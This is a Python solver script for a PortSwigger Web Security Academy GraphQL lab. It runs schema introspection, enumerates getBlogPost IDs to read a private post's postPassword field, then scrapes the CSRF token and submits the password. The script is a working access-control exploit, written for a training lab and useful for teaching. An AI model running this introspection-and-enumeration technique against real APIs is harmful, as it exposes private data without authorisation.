#!/usr/bin/env python3
"""
Accessing private GraphQL posts
PortSwigger Web Security Academy -- GraphQL API vulnerabilities

Companion script for the writeup: 01-accessing-private-graphql-posts.md

What this does:
    Introspects the /graphql/v1 endpoint to recover the BlogPost type's real
    field names (the schema exposes isPrivate and postPassword right next to
    the public fields), then enumerates getBlogPost(id: N) sequentially until
    it finds a post carrying a populated postPassword -- the value this lab
    wants submitted as the solution.

Usage:
    python 01-accessing-private-graphql-posts.py <lab-url>
    e.g. python 01-accessing-private-graphql-posts.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

GRAPHQL_PATH = "/graphql/v1"

# Same full introspection query our GraphQL.py capability sends first.
INTROSPECTION_QUERY = (
    "query IntrospectionQuery { __schema { queryType { name } mutationType "
    "{ name } subscriptionType { name } types { ...FullType } directives "
    "{ name description args { ...InputValue } } } } "
    "fragment FullType on __Type { kind name description "
    "fields(includeDeprecated: true) { name description args { ...InputValue } "
    "type { ...TypeRef } isDeprecated deprecationReason } inputFields "
    "{ ...InputValue } interfaces { ...TypeRef } "
    "enumValues(includeDeprecated: true) { name description isDeprecated "
    "deprecationReason } possibleTypes { ...TypeRef } } "
    "fragment InputValue on __InputValue { name description type { ...TypeRef } "
    "defaultValue } "
    "fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name "
    "ofType { kind name } } } }"
)


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    endpoint = f"{lab_url}{GRAPHQL_PATH}"

    r = client.post(endpoint, json={"query": INTROSPECTION_QUERY})
    data = r.json() if r.status_code == 200 else {}
    fields = []
    for t in data.get("data", {}).get("__schema", {}).get("types", []):
        if t.get("name") == "BlogPost":
            fields = [f["name"] for f in (t.get("fields") or [])]
            break
    if fields:
        print(f"[+] Introspection returned BlogPost fields: {', '.join(fields)}")
    else:
        print("[-] Introspection did not return a BlogPost type -- continuing with the known field names anyway")

    # Field names taken verbatim from introspection: "paragraphs", not "body" --
    # a wrong guess here fails silently since GraphQL doesn't typo-correct.
    query = (
        "query {{ getBlogPost(id: {id}) {{ id title paragraphs author "
        "{{ username }} isPrivate postPassword }} }}"
    )

    print("[*] Enumerating getBlogPost(id: 1..9) for a populated postPassword...")
    for post_id in range(1, 10):
        r = client.post(endpoint, json={"query": query.format(id=post_id)})
        try:
            post = r.json().get("data", {}).get("getBlogPost")
        except Exception:
            continue
        if post and post.get("isPrivate") and post.get("postPassword"):
            password = post["postPassword"]
            print(f"[+] Post {post_id} is private and carries a password: {password}")

            m = re.search(r'name="csrf"\s+value="([^"]+)"', client.get(lab_url).text)
            csrf = m.group(1) if m else ""
            client.post(f"{lab_url}/submitSolution", data={"answer": password, "csrf": csrf})

            check = client.get(lab_url)
            if "Congratulations" in check.text:
                print("[+] Lab solved -- private post password accepted.")
            else:
                print("[-] Submission sent but the lab did not flip to solved -- verify the password manually.")
            return

    print("[-] No private post with a populated postPassword found in IDs 1-9.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
